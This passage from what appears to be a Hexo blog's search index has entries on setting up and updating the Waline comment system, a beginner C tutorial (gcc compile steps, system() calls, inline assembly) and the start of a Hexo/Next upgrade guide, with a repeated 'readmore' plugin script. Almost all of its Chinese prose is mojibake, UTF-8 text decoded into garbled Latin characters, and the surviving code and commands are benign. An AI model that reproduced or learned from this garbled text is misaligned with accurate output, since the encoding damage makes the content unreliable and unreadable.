KiB ../../node_modules/querystring/index.js 127 bytes [built] [code generated] ../../node_modules/querystring/decode.js 2.34 KiB [built] [code generated] ../../node_modules/querystring/encode.js 2.04 KiB [built] [code generated]webpack 5.50.0 compiled successfully in 3160 ms å¦‚æœå¸Œæœ›åœ¨ Hexo Next ä¸»é¢˜é‡Œæµ‹è¯•æœ¬åœ°çš„ @waline/clientï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ Next çš„ _config.yml é…ç½®æ–‡ä»¶ä¸­æŒ‡å®š Waline æ’ä»¶çš„ libUrl å‚æ•°ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 1234waline: enable: true libUrl: http://127.0.0.1:9000/Waline.min.js # Set custom waline cdn url .... æœ¬åœ°ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ @waline/serverï¼Œä¸ºäº†ä½¿ @waline/server èƒ½åœ¨æœ¬åœ°æ­£å¸¸è¿è¡Œï¼Œéœ€è¦é…ç½®å¿…è¦çš„æœ¬åœ°ç¯å¢ƒå˜é‡è‡³ waline/example/.envï¼Œå…¶ä¸­åœ¨ waline/example/.env.example æ–‡ä»¶é‡Œæœ‰å¯å‚è€ƒçš„é…ç½®ç¤ºä¾‹ã€‚@waline/server æ­£å¸¸å¯åŠ¨åï¼Œé»˜è®¤çš„æœåŠ¡å™¨åœ°å€æ˜¯ http://127.0.0.1:9000ã€‚ 1$ npm run server:dev ç¼–è¯‘æ„å»º12345678# æ„å»º@waline/admin$ npm run admin:build# æ„å»º@waline/client$ npm run client:build# æˆ–è€…åŒæ—¶æ„å»º@waline/adminä¸@waline/client$ npm run build Waline ç»„ä»¶ç¼–è¯‘æ„å»ºå®Œæˆåï¼Œé»˜è®¤ä¼šåœ¨ waline/node_modules/@waline ç›®å½•ä¸‹ç”Ÿæˆå¯¹åº”çš„æ–‡ä»¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼š 12345waline/node_modules/@walineâ”œâ”€â”€ admin -&gt; ../../packages/adminâ”œâ”€â”€ client -&gt; ../../packages/clientâ”œâ”€â”€ cloudbase -&gt; ../../packages/cloudbaseâ””â”€â”€ vercel -&gt; ../../packages/server å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»¥ @waline/client ç»„ä»¶ä¸ºä¾‹ï¼Œç¼–è¯‘æ„å»ºå®Œæˆåï¼Œå®é™…çš„è¾“å‡ºè·¯å¾„æ˜¯ï¼šwaline/packages/client/dist Waline å¸¸è§é—®é¢˜é˜²æ­¢æ¶æ„åˆ·è¯„è®º Waline æœåŠ¡ç«¯å¯ç”¨è¯„è®ºå®¡æ ¸åŠŸèƒ½ Waline æœåŠ¡ç«¯å¯ç”¨åŸºäº IP çš„è¯„è®ºå‘å¸ƒé¢‘ç‡é™åˆ¶åŠŸèƒ½ Waline æœåŠ¡ç«¯å¯ç”¨å®¢æˆ·ç«¯ç™»å½•åæ‰å…è®¸è¯„è®ºçš„åŠŸèƒ½ï¼Œç¡®ä¿æœåŠ¡ç«¯çš„ç‰ˆæœ¬å¤§äºç­‰äº 0.26.0ï¼ŒåŒæ—¶ Waline çš„å®¢æˆ·ç«¯éœ€è¦å¢åŠ  login=force çš„é…ç½®ç”¨äºéšè—åšå®¢é¡µé¢ä¸Šçš„è¯„è®ºåŒ¿åè¾“å…¥æ¡† Waline çš„æœåŠ¡ç«¯å¦‚æœå¯ç”¨å®¢æˆ·ç«¯ç™»å½•åæ‰å…è®¸è¯„è®ºçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆè¿˜éœ€è¦åœ¨æœåŠ¡ç«¯çš„ç¯å¢ƒå˜é‡é‡Œé…ç½®é‚®ä»¶æœåŠ¡ç›¸å…³çš„å‚æ•°ï¼›è¿™æ˜¯ä¸ºäº†é˜²æ­¢æ¶æ„æ³¨å†Œï¼Œå½“é…ç½®äº†é‚®ä»¶æœåŠ¡ç›¸å…³çš„ç¯å¢ƒå˜é‡åï¼Œç”¨æˆ·æ³¨å†Œæµç¨‹ä¼šå¢åŠ é‚®ç®±éªŒè¯ç ç¡®è®¤ç›¸å…³çš„æ“ä½œ Waline å‘å¸ƒè¯„è®ºå¾ˆæ…¢å‘å¸ƒè¯„è®ºçš„æ—¶å€™å› ä¸ºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œä¾‹å¦‚åƒåœ¾é‚®ä»¶æ£€æµ‹ã€è¯„è®ºé€šçŸ¥éƒ½æ˜¯ä¸²è”æ“ä½œã€‚å…¶ä¸­åƒåœ¾é‚®ä»¶æ£€æµ‹ä½¿ç”¨çš„æ˜¯ Akismet æä¾›çš„æœåŠ¡ï¼Œè¿™å—ç”±äºè°ƒç”¨å›½å¤–æœåŠ¡å¯èƒ½ä¼šé€ æˆè®¿é—®è¿‡æ…¢ï¼Œå¯ä»¥é€šè¿‡ AKISMET_KEY=false åç«¯ç¯å¢ƒå˜é‡å…³é—­åƒåœ¾è¯„è®ºæ£€æµ‹åŠŸèƒ½æ¥å®šä½é—®é¢˜ã€‚é™¤äº†åƒåœ¾è¯„è®ºæ£€æµ‹æœåŠ¡ä¹‹å¤–ï¼Œè¯„è®ºé€šçŸ¥ä¸­çš„é‚®ä»¶é€šçŸ¥ä¹Ÿæœ‰å¯èƒ½é€ æˆè¶…æ—¶ï¼Œè¿™å—å»ºè®®å¯ä»¥å…ˆå…³é—­è¯„è®ºé€šçŸ¥å†æµ‹ä¸€ä¸‹æ˜¯å¦æ˜¯å› ä¸ºè¯¥åŠŸèƒ½å¯¼è‡´çš„è¿‡æ…¢ã€‚ Github ç™»å½•æ— æ³•ç®¡ç†åå°Github ç™»å½•åæ— æ³•ç®¡ç†åå°ï¼Œè§£å†³æ–¹æ³•å¯å‚è€ƒ Github Issueï¼šé€šè¿‡ Github ç™»å½•æ— æ³•ç®¡ç†åå° Waline ç‰ˆæœ¬æ›´æ–°æµç¨‹ æ›´æ–° MySQL æ•°æ®åº“è¡¨ç»“æ„ æ›´æ–° Hexo-Waline-Next æ’ä»¶ æ›´æ–° Waline Server çš„ä»£ç ï¼Œé‡æ–°æ„å»º Docker é•œåƒ è‹¥åœ¨ Next ä¸»é¢˜çš„ _config.yml æ–‡ä»¶ä¸­ï¼ŒWaline å®˜æ–¹æ’ä»¶çš„ CDN é…ç½®é‡Œæœ‰æŒ‡å®š Waline Client çš„ç‰ˆæœ¬ï¼ˆå¦‚ä¸‹é…ç½®ï¼‰ï¼Œé‚£ä¹ˆè¿˜éœ€è¦æ›´æ”¹ Client çš„ç‰ˆæœ¬å·ï¼Œå¦åˆ™é»˜è®¤ä¼šä½¿ç”¨æœ€æ–°ç‰ˆçš„ Waline Client 1234waline: enable: true libUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.js cssUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.css æç¤º ç”±äº Waline é‡‡ç”¨ Client/Server æ¶æ„ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„ç‰ˆæœ¬ä¸€èˆ¬éœ€è¦åŒ¹é…æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚ waline/packages/server/src/controller/index.js æºæ–‡ä»¶æ¶‰åŠåˆ° Waline Client ç‰ˆæœ¬çš„å®šä¹‰ï¼ˆæœ€æ–°ç‰ˆæœ¬ï¼‰ waline/packages/server/src/middleware/dashboard.js æºæ–‡ä»¶æ¶‰åŠåˆ° Waline Admin ç‰ˆæœ¬çš„å®šä¹‰ï¼ˆæœ€æ–°ç‰ˆæœ¬ï¼‰ é¡¹ç›®æºç  Waline Github Waline DockerHub å‚è€ƒåšå®¢ Waline å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"C è¯­è¨€åŸºç¡€ä¹‹ä¸€",url:"/posts/1228be9f.html",text:'è¯­è¨€å‘å±•å†ç¨‹æœºå™¨è¯­è¨€è®¡ç®—æœºçš„å¤§è„‘æˆ–è€…è¯´å¿ƒè„å°±æ˜¯ CPUï¼Œå®ƒæ§åˆ¶ç€æ•´ä¸ªè®¡ç®—æœºçš„è¿ä½œã€‚æ¯ç§ CPUï¼Œéƒ½æœ‰è‡ªå·±çš„æŒ‡ä»¤ç³»ç»Ÿã€‚è¿™ä¸ªæŒ‡ä»¤ç³»ç»Ÿï¼Œå°±æ˜¯è¯¥ CPU çš„æœºå™¨è¯­è¨€ã€‚æœºå™¨è¯­è¨€æ˜¯ä¸€ç»„ç”± 0 å’Œ 1 ç³»åˆ—ç»„æˆçš„æŒ‡ä»¤ç ï¼Œè¿™äº›æŒ‡ä»¤ç ï¼Œæ˜¯ CPU åˆ¶é€ å‚å•†è§„å®šå‡ºæ¥çš„ï¼Œç„¶åå‘å¸ƒå‡ºæ¥ï¼Œè¦æ±‚ç¨‹åºå‘˜éµå®ˆã€‚è¦è®©è®¡ç®—æœºå¹²æ´»ï¼Œå°±å¾—ç”¨æœºå™¨è¯­è¨€ï¼ˆäºŒçº§åˆ¶æ•°ï¼‰å»å‘½ä»¤å®ƒã€‚è¿™æ ·çš„å‘½ä»¤ï¼Œä¸æ˜¯ä¸€æ¡ä¸¤æ¡ï¼Œè€Œæ˜¯ä¸Šç™¾æ¡ã€‚ä¸åŒå‹å·çš„è®¡ç®—æœºå…¶æœºå™¨è¯­è¨€æ˜¯ä¸ç›¸é€šçš„ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨æŸç§è®¡ç®—æœºçš„æœºå™¨æŒ‡ä»¤ç¼–åˆ¶çš„ç¨‹åºï¼Œä¸èƒ½åœ¨å¦ä¸€ç§è®¡ç®—æœºä¸Šæ‰§è¡Œã€‚ æ±‡ç¼–è¯­è¨€æœºå™¨è¯­è¨€ç¼–ç¨‹å¾ˆä»¤äººçƒ¦æ¼ï¼Œå› æ­¤ç»ˆäºå‡ºç°äº†æ±‡ç¼–è¯­è¨€ï¼Œå°±æ˜¯ä¸€äº›æ ‡è¯†ç¬¦å–ä»£ 0 ä¸ 1ã€‚æ±‡ç¼–è¯­è¨€æ˜¯ä¸€é—¨äººç±»å¯ä»¥æ¯”è¾ƒè½»æ¾è®¤è¯†çš„ç¼–ç¨‹è¯­è¨€ã€‚åªæ˜¯è¿™é—¨è¯­è¨€è®¡ç®—æœºå¹¶ä¸è®¤è¯†ï¼Œæ‰€ä»¥äººç±»è¿˜ä¸èƒ½ç”¨è¿™é—¨è¯­è¨€å‘½ä»¤è®¡ç®—æœºåšäº‹æƒ…ã€‚æ‰€ä»¥ï¼Œæœ‰ä¸€ç±»ä¸“é—¨çš„ç¨‹åºï¼Œæ—¢è®¤è¯†æœºå™¨è¯­è¨€ï¼Œåˆè®¤è¯†æ±‡ç¼–è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯ç¼–è¯‘å™¨ï¼Œå°†æ ‡è¯†ç¬¦æ¢æˆ 0 ä¸ 1ï¼ŒçŸ¥é“æ€ä¹ˆæŠŠæ±‡ç¼–è¯­è¨€ç¿»è¯‘æˆæœºå™¨è¯­è¨€ã€‚ é«˜çº§è¯­è¨€æ±‡ç¼–è¯­è¨€å’Œæœºå™¨è¯­è¨€éƒ½æ˜¯é¢å‘æœºå™¨çš„ï¼Œæœºå™¨ä¸åŒï¼Œè¯­è¨€ä¹Ÿä¸åŒã€‚æ—¢ç„¶æœ‰åŠæ³•è®©æ±‡ç¼–è¯­è¨€ç¿»è¯‘æˆæœºå™¨è¯­è¨€ï¼Œéš¾é“å°±ä¸èƒ½æŠŠå…¶ä»–æ›´äººæ€§åŒ–çš„è¯­è¨€ç¿»è¯‘æˆæœºå™¨è¯­è¨€ï¼Ÿ1954 å¹´ï¼ŒFortran è¯­è¨€å‡ºç°äº†ï¼Œå…¶åç›¸ç»§å‡ºç°äº†å…¶ä»–çš„ç±»ä¼¼è¯­è¨€ã€‚è¿™æ‰¹è¯­è¨€ï¼Œä½¿ç¨‹åºå‘˜æ‘†è„±äº†è®¡ç®—æœºç¡¬ä»¶çš„é™åˆ¶ï¼ŒæŠŠä¸»è¦ç²¾åŠ›æ”¾åœ¨äº†ç¨‹åºè®¾è®¡ä¸Šï¼Œä¸åœ¨å…³æ³¨ä½å±‚çš„è®¡ç®—æœºç¡¬ä»¶ã€‚è¿™ç±»è¯­è¨€ï¼Œç§°ä¸ºé«˜çº§è¯­è¨€ã€‚åŒæ ·çš„ï¼Œé«˜çº§è¯­è¨€è¦è¢«è®¡ç®—æœºæ‰§è¡Œï¼Œä¹Ÿéœ€è¦ä¸€ä¸ªç¿»è¯‘ç¨‹åºå°†å…¶ç¿»è¯‘æˆæœºå™¨è¯­è¨€ï¼Œè¿™å°±æ˜¯ç¼–è¯‘ç¨‹åºï¼Œç®€ç§° â€œç¼–è¯‘å™¨â€ã€‚è¿™ç±»é«˜çº§è¯­è¨€è§£å†³é—®é¢˜çš„æ–¹æ³•æ˜¯åˆ†æå‡ºè§£å†³é—®é¢˜æ‰€éœ€è¦çš„æ­¥éª¤ï¼ŒæŠŠç¨‹åºçœ‹ä½œæ˜¯æ•°æ®è¢«åŠ å·¥çš„è¿‡ç¨‹ã€‚åŸºäºè¿™ç±»æ–¹æ³•çš„ç¨‹åºè®¾è®¡è¯­è¨€ï¼Œæˆä¸ºäº†é¢å‘è¿‡ç¨‹çš„è¯­è¨€ã€‚ è¯­è¨€çš„å±‚æ¬¡ è¯­è¨€çš„è¿›åŒ–å² ä¸ºä»€ä¹ˆè¦å­¦ä¹  C è¯­è¨€C è¯­è¨€çš„ç‰¹ç‚¹ä¼˜ç‚¹ï¼š ä»£ç é‡å° åŠŸèƒ½å¼ºå¤§ ç¼–ç¨‹è‡ªç”± æ‰§è¡Œé€Ÿåº¦å¿« ç¼ºç‚¹ï¼š å¯ç§»æ¤æ€§è¾ƒå·® å¯¹å¹³å°åº“ä¾èµ–è¾ƒå¤š å†™ä»£ç å®ç°å‘¨æœŸé•¿ è¿‡äºè‡ªç”±ï¼Œç»éªŒä¸è¶³æ˜“å‡ºé”™ å­¦ä¹  C è¯­è¨€ç†ç”± C è¯­è¨€çš„åº”ç”¨é¢†åŸŸC è¯­è¨€çš„åº”ç”¨æå…¶å¹¿æ³›ï¼Œä»ç½‘ç«™åå°ï¼Œåˆ°åº•å±‚æ“ä½œç³»ç»Ÿï¼Œä»å¤šåª’ä½“åº”ç”¨åˆ°å¤§å‹ç½‘ç»œæ¸¸æˆï¼Œå‡å¯ä½¿ç”¨ C è¯­è¨€æ¥å¼€å‘ï¼š C è¯­è¨€å¯ä»¥å†™ç½‘ç«™åå°ç¨‹åº C è¯­è¨€å¯ä»¥ä¸“é—¨é’ˆå¯¹æŸä¸ªé¢†åŸŸå†™å‡ºåŠŸèƒ½å¼ºå¤§çš„ç¨‹åºåº“ C è¯­è¨€å¯ä»¥å†™å‡ºå¤§å‹æ¸¸æˆçš„å¼•æ“ C è¯­è¨€å¯ä»¥å†™å‡ºå¦ä¸€ä¸ªè¯­è¨€æ¥ï¼Œä¾‹å¦‚ï¼šPHP çº¯ C è¯­è¨€å¼€å‘çš„ C è¯­è¨€å¯ä»¥å†™æ“ä½œç³»ç»Ÿå’Œé©±åŠ¨ç¨‹åºï¼Œå¹¶ä¸”ä¸€èˆ¬åªèƒ½ç”¨ C è¯­è¨€ç¼–å†™ ä»»ä½•è®¾å¤‡åªè¦é…ç½®äº†å¾®å¤„ç†å™¨ï¼Œå°±éƒ½æ”¯æŒ C è¯­è¨€ã€‚ä»å¾®æ³¢ç‚‰åˆ°æ‰‹æœºï¼Œéƒ½æ˜¯ç”± C è¯­è¨€æŠ€æœ¯æ¥æ¨åŠ¨çš„ è¯¦è§ï¼šå„ç±»è¯­è¨€çš„åº”ç”¨é¢†åŸŸå›¾è§£åˆ†æ ç¬¬ä¸€ä¸ª C è¯­è¨€ç¨‹åºç¼–å†™ä»£ç 123456#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { printf("Hello World!\\n"); return 0;} ç¼–è¯‘ä»£ç  GCC ç¼–è¯‘å‘½ä»¤å¸¸ç”¨é€‰é¡¹è¯´æ˜ é€‰é¡¹ å«ä¹‰ -o æŒ‡å®šç”Ÿæˆçš„è¾“å‡ºæ–‡ä»¶å -E åªè¿›è¡Œé¢„å¤„ç† -S åªè¿›è¡Œé¢„å¤„ç†å’Œç¼–è¯‘ -c åªè¿›è¡Œé¢„å¤„ç†ã€ç¼–è¯‘å’Œæ±‡ç¼– ç¼–è¯‘ä»£ç ï¼Œç”Ÿæˆå¯ä»¥æ‰§è¡Œæ–‡ä»¶ 1$ gcc hello.c -o hello è¿è¡Œä»£ç  è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ 123$ ./helloHello World! ä»£ç åˆ†æ #include å¤´æ–‡ä»¶åŒ…å«ï¼š #include çš„æ„æ€æ˜¯å¤´æ–‡ä»¶åŒ…å«ï¼Œ#include &lt;stdio.h&gt; è¡¨ç¤ºåŒ…å« stdio.h è¿™ä¸ªå¤´æ–‡ä»¶ ä½¿ç”¨ C è¯­è¨€åº“å‡½æ•°æ—¶ï¼Œéœ€è¦æå‰åŒ…å«åº“å‡½æ•°å¯¹åº”çš„å¤´æ–‡ä»¶ï¼Œå¦‚è¿™é‡Œä½¿ç”¨äº† printf() å‡½æ•°ï¼Œåˆ™éœ€è¦åŒ…å« stdio.h å¤´æ–‡ä»¶ #include &lt;&gt; ä¸ #include "" çš„åŒºåˆ«ï¼š &lt;&gt; è¡¨ç¤ºç¼–è¯‘å™¨ç›´æ¥æŒ‰ç³»ç»ŸæŒ‡å®šçš„ç›®å½•ï¼ˆ/usr/includeï¼‰æ£€ç´¢å¤´æ–‡ä»¶ "" è¡¨ç¤ºç³»ç»Ÿå…ˆåœ¨ "" æŒ‡å®šçš„è·¯å¾„ï¼ˆæ²¡å†™è·¯å¾„åˆ™é»˜è®¤ä½¿ç”¨å½“å‰è·¯å¾„ï¼‰æŸ¥æ‰¾å¤´æ–‡ä»¶ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå†æŒ‰ç³»ç»ŸæŒ‡å®šçš„ç›®å½•æ£€ç´¢ main() å‡½æ•° ä¸€ä¸ªå®Œæ•´çš„ C è¯­è¨€ç¨‹åºï¼Œæ˜¯ç”±ä¸€ä¸ªã€ä¸”åªèƒ½æœ‰ä¸€ä¸ª main() å‡½æ•°ï¼ˆåˆç§°ä¸»å‡½æ•°ï¼Œå¿…é¡»æœ‰ï¼‰å’Œè‹¥å¹²ä¸ªå…¶ä»–å‡½æ•°ç»“åˆè€Œæˆï¼ˆå¯é€‰ï¼‰ main() å‡½æ•°æ˜¯ C è¯­è¨€ç¨‹åºçš„å…¥å£ï¼Œç¨‹åºæ˜¯ä» main() å‡½æ•°å¼€å§‹æ‰§è¡Œçš„ printf() å‡½æ•° printf() æ˜¯ C è¯­è¨€åº“å‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯å‘æ ‡å‡†è¾“å‡ºè®¾å¤‡è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸² printf() å‡½æ•°åœ¨ stdio.h å¤´æ–‡ä»¶é‡Œå®šä¹‰ \\n è¡¨ç¤ºå›è½¦æ¢è¡Œ return è¯­å¥ return ä»£è¡¨å‡½æ•°æ‰§è¡Œå®Œæ¯• å¦‚æœ main() å‡½æ•°å®šä¹‰çš„æ—¶å€™å‰é¢æ˜¯ intï¼Œé‚£ä¹ˆ return åé¢å°±éœ€è¦å†™ä¸€ä¸ªæ•´æ•° å¦‚æœ main() å‡½æ•°å®šä¹‰çš„æ—¶å€™å‰é¢æ˜¯ voidï¼Œé‚£ä¹ˆ return åé¢ä»€ä¹ˆä¹Ÿä¸éœ€è¦å†™ åœ¨ main() å‡½æ•°ä¸­ return 0 ä»£è¡¨ç¨‹åºæ‰§è¡ŒæˆåŠŸï¼Œreturn -1 ä»£è¡¨ç¨‹åºæ‰§è¡Œå¤±è´¥ int main() å’Œ void main() åœ¨ C è¯­è¨€ä¸­éƒ½æ˜¯æ”¯æŒçš„ï¼Œä½† C++ åªæ”¯æŒ int main() è¿™ç§å®šä¹‰æ–¹å¼ system å‡½æ•°system å‡½æ•°çš„å®šä¹‰1234567å¤´æ–‡ä»¶ï¼š#include &lt;stdlib.h&gt;å£°æ˜ï¼šint system(const char *command);åŠŸèƒ½ï¼šåœ¨å·²ç»è¿è¡Œçš„ç¨‹åºä¸­æ‰§è¡Œå¦å¤–ä¸€ä¸ªå¤–éƒ¨ç¨‹åºå‚æ•°ï¼šå¤–éƒ¨å¯æ‰§è¡Œç¨‹åºåå­—è¿”å›å€¼ï¼š æˆåŠŸï¼šä¸åŒç³»ç»Ÿè¿”å›å€¼ä¸ä¸€æ · å¤±è´¥ï¼šé€šå¸¸æ˜¯ -1 system å‡½æ•°çš„è°ƒç”¨12345678#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) { system("ls"); // Linux å¹³å° // system("calc"); // Windows å¹³å° return 0;} system å‡½æ•°çš„è¿”å›å€¼åœ¨ Linux å’Œ Windows ç³»ç»Ÿä¸‹åˆ†åˆ«è°ƒç”¨ system() å‡½æ•°ï¼Œè‹¥è°ƒç”¨æˆåŠŸè¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œè‹¥è°ƒåŠ¨å¤±è´¥è¿”å›å€¼ä¸€èˆ¬ä¸º -1ã€‚C è¯­è¨€æ‰€æœ‰çš„åº“å‡½æ•°è°ƒç”¨ï¼Œåªèƒ½ä¿è¯è¯­æ³•æ˜¯ä¸€è‡´çš„ï¼Œä½†ä¸èƒ½ä¿è¯æ‰§è¡Œç»“æœæ˜¯ä¸€è‡´çš„ï¼›åŒæ ·çš„åº“å‡½æ•°åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸‹æ‰§è¡Œç»“æœå¯èƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚Linux çš„å‘å±•ç¦»ä¸å¼€ POSIX æ ‡å‡†ï¼Œåªè¦ç¬¦åˆè¿™ä¸ªæ ‡å‡†çš„å‡½æ•°ï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸‹æ‰§è¡Œçš„ç»“æœå°±å¯ä»¥ä¸€è‡´ã€‚Unix å’Œ Linux å¾ˆå¤šåº“å‡½æ•°éƒ½æ˜¯æ”¯æŒ POSIX æ ‡å‡†çš„ï¼Œä½† Windows æ”¯æŒçš„æ¯”è¾ƒå·®ã€‚å¦‚æœå°† Unix ä»£ç ç§»æ¤åˆ° Linux ä¸€èˆ¬ä»£ä»·å¾ˆå°ï¼Œå¦‚æœæŠŠ Windows ä»£ç ç§»æ¤åˆ° Unix æˆ–è€… Linux å°±æ¯”è¾ƒéº»çƒ¦ã€‚ C è¯­è¨€çš„ç¼–è¯‘è¿‡ç¨‹C è¯­è¨€çš„ç¼–è¯‘æ­¥éª¤C è¯­è¨€ç¼–è¯‘æˆå¯æ‰§è¡Œç¨‹åºéœ€è¦ç»è¿‡ä»¥ä¸‹ 4 ä¸ªæ­¥éª¤ï¼Œè¯¦è§ ç¼–è¯‘æµç¨‹å›¾ã€‚ é¢„å¤„ç†ï¼šå®å®šä¹‰å±•å¼€ã€å¤´æ–‡ä»¶å±•å¼€ã€æ¡ä»¶ç¼–è¯‘ç­‰ï¼ŒåŒæ—¶å°†ä»£ç ä¸­çš„æ³¨é‡Šåˆ é™¤ï¼Œè¿™é‡Œå¹¶ä¸ä¼šæ£€æŸ¥è¯­æ³• ç¼–è¯‘ï¼šæ£€æŸ¥è¯­æ³•ï¼Œå°†é¢„å¤„ç†åæ–‡ä»¶ç¼–è¯‘ç”Ÿæˆæ±‡ç¼–æ–‡ä»¶ æ±‡ç¼–ï¼šå°†æ±‡ç¼–æ–‡ä»¶ç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ é“¾æ¥ï¼šC è¯­è¨€ç¼–å†™çš„ç¨‹åºæ˜¯éœ€è¦ä¾èµ–å„ç§åº“çš„ï¼Œæ‰€ä»¥ç¼–è¯‘ä¹‹åè¿˜éœ€è¦æŠŠåº“é“¾æ¥åˆ°æœ€ç»ˆçš„å¯æ‰§è¡Œç¨‹åºä¸­å» GCC çš„ç¼–è¯‘è¿‡ç¨‹GCC çš„ç¼–è¯‘æ­¥éª¤ æ­¥éª¤ å‘½ä»¤ 1. é¢„å¤„ç† gcc -E hello.c -o hello.i 2. ç¼–è¯‘åˆ°æ±‡ç¼–ä»£ç  gcc -S hello.c -o hello.s 3. æ±‡ç¼–åˆ°ç›®æ ‡ä»£ç ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ gcc -c hello.s -o hello.o 4. é“¾æ¥ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ gcc hello.o -o hello å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä»¥ä¸Šå››ä¸ªæ­¥éª¤ï¼Œå¯ä»¥åˆæˆä¸€ä¸ªæ­¥éª¤ï¼Œç›´æ¥ç¼–è¯‘é“¾æ¥æˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼Œå‘½ä»¤æ˜¯ gcc hello.c -o hello æ–‡ä»¶åç¼€çš„ä¸åŒå«ä¹‰ æ–‡ä»¶åç¼€ å«ä¹‰ .c C è¯­è¨€æ–‡ä»¶ .i é¢„å¤„ç†åçš„ C è¯­è¨€æ–‡ä»¶ .s ç¼–è¯‘åçš„æ±‡ç¼–æ–‡ä»¶ .o ç¼–è¯‘åçš„ç›®æ ‡æ–‡ä»¶ æŸ¥æ‰¾ç¨‹åºæ‰€ä¾èµ–çš„åŠ¨æ€åº“12345678# GCCç¼–è¯‘$ gcc hello.c -o hello# æŸ¥çœ‹æ‰€ä¾èµ–çš„åŠ¨æ€åº“$ ldd hello linux-vdso.so.1 =&gt; (0x00007f152053a000) libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f151ff4d000) /lib64/ld-linux-x86-64.so.2 (0x00007f152031b000) åœ¨ Windows ç³»ç»Ÿé‡Œï¼Œå¯ä»¥ä½¿ç”¨ Dependency Walker å·¥å…·æŸ¥çœ‹ç¨‹åºæ‰€ä¾èµ–çš„åŠ¨æ€åº“ï¼ˆDLLï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š VS ä¸­ C è¯­è¨€åµŒå¥—æ±‡ç¼–ä»£ç åœ¨ Visual Studio ä¸­ï¼Œç”±äºä¸‹è¿°ä»£ç ä½¿ç”¨äº† eax å¯„å­˜å™¨ï¼Œå› æ­¤ç¨‹åºéœ€è¦è¿è¡Œåœ¨ 32 ä½ï¼ˆx86ï¼‰çš„å¹³å°ã€‚ 12345678910111213141516171819#include &lt;stdio.h&gt;int main() { int a; int b; int c; __asm { mov a, 3 // 3çš„å€¼æ”¾åœ¨aå¯¹åº”å†…å­˜çš„ä½ç½® mov b, 4 // 4çš„å€¼æ”¾åœ¨aå¯¹åº”å†…å­˜çš„ä½ç½® mov eax, a // æŠŠaå†…å­˜çš„å€¼æ”¾åœ¨eaxå¯„å­˜å™¨ add eax, b // eaxå’Œbç›¸åŠ ï¼Œç»“æœæ”¾åœ¨eax mov c, eax // eaxçš„å€¼æ”¾åœ¨cä¸­ } printf("c = %d\\n", c); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€"},{title:"Hexo ä¸ Next ç‰ˆæœ¬å‡çº§æ•™ç¨‹",url:"/posts/d1f06120.html",text:'å‰è¨€ Next å®˜æ–¹åšå®¢ Next å®˜æ–¹æ•™ç¨‹ - ç‰ˆæœ¬å‡çº§ Next å„ç‰ˆæœ¬çš„ä»“åº“ å¹´ä»½ ç‰ˆæœ¬ ä»“åº“ 2014 ~ 2017 v5 https://github.com/iissnan/hexo-theme-next 2018 ~ 2019 v6 ~ v7 https://github.com/theme-next/hexo-theme-next 2020 v8 https://github.com/next-theme/hexo-theme-next Next ä¸ Hexo ç‰ˆæœ¬é€‚é…å…³ç³» NodeJS ç‰ˆæœ¬å‡çº§NodeJS ç‰ˆæœ¬å‡çº§ä¸æ˜¯å¿…é¡»çš„ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µé€‰æ‹©æ˜¯å¦å‡çº§ï¼Œé¦–å…ˆåœ¨ NodeJS 